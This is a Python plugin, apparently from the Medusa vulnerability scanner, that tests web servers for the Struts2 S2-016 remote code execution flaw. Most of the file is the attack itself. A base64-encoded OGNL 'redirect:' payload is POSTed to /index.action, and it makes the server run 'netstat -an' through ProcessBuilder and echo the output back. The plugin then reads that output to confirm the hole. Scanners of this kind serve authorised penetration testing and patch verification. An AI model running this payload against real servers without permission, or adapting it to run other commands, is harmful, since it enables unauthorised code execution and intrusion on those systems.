#!/usr/bin/env python
# -*- coding: utf-8 -*-
import base64
from Modules.Struts2.CriticalResult import Result
import requests
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,ErrorHandling,Proxies
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-3-14"  # 插件编辑时间
        self.info['disclosure']='2020-3-11'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability16"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞16' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = "0"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "低于Struts2.3.15.1"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=Proxies().result(proxies)

    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    data=base64.b64decode("cmVkaXJlY3Q6JHslMjNyZXElM2QlMjNjb250ZXh0LmdldCglMjdjbyUyNyUyYiUyN20ub3BlbiUyNyUyYiUyN3N5bXBob255Lnh3byUyNyUyYiUyN3JrMi5kaXNwJTI3JTJiJTI3YXRjaGVyLkh0dHBTZXIlMjclMmIlMjd2bGV0UmVxJTI3JTJiJTI3dWVzdCUyNyksJTIzcyUzZG5ldyUyMGphdmEudXRpbC5TY2FubmVyKChuZXclMjBqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIoJTI3bmV0c3RhdCUyMC1hbiUyNy50b1N0cmluZygpLnNwbGl0KCUyN1xccyUyNykpKS5zdGFydCgpLmdldElucHV0U3RyZWFtKCkpLnVzZURlbGltaXRlciglMjdcXEElMjcpLCUyM3N0ciUzZCUyM3MuaGFzTmV4dCgpPyUyM3MubmV4dCgpOiUyNyUyNywlMjNyZXNwJTNkJTIzY29udGV4dC5nZXQoJTI3Y28lMjclMmIlMjdtLm9wZW4lMjclMmIlMjdzeW1waG9ueS54d28lMjclMmIlMjdyazIuZGlzcCUyNyUyYiUyN2F0Y2hlci5IdHRwU2VyJTI3JTJiJTI3dmxldFJlcyUyNyUyYiUyN3BvbnNlJTI3KSwlMjNyZXNwLnNldENoYXJhY3RlckVuY29kaW5nKCUyN1VURi04JTI3KSwlMjNyZXNwLmdldFdyaXRlcigpLnByaW50bG4oJTIzc3RyKSwlMjNyZXNwLmdldFdyaXRlcigpLmZsdXNoKCksJTIzcmVzcC5nZXRXcml0ZXIoKS5jbG9zZSgpfQ==")
    try:
        payload_url = scheme + "://" + url +":"+ str(port)+"/index.action"
        headers = {
            'User-Agent': RandomAgent,
            "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        resp = requests.post(payload_url,headers=headers,data=data,proxies=proxies, timeout=6, verify=False)
        con = resp.text
        resilt=Result(con)
        if resilt=="Linux" or resilt=="NoteOS" or resilt=="Windows":
            Medusa = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n版本号:S2-016\r\n返回数据:{}\r\n".format(url,con,resilt)
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
